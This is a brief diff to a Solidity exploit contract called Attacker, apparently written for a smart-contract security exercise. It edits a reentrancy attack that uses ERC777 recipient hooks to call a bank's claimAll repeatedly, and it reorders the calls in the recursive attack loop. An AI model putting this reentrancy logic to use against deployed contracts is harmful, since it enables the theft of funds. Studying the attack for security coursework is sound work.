@@ -43,8 +43,9 @@ contract Attacker is AccessControl, IERC777Recipient {
       emit Deposit(amt);
    
       bank.deposit();
-		  bank.claimAll();
+	
     }
+	  bank.claimAll();
 	}
 
 	/*
@@ -70,8 +71,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE GOES HERE
     while (depth <= max_depth){
       emit Recurse(depth);
-      attack(amount);
       depth++;
+      attack(amount);
     }
     // recursively triggers reentrancy
 
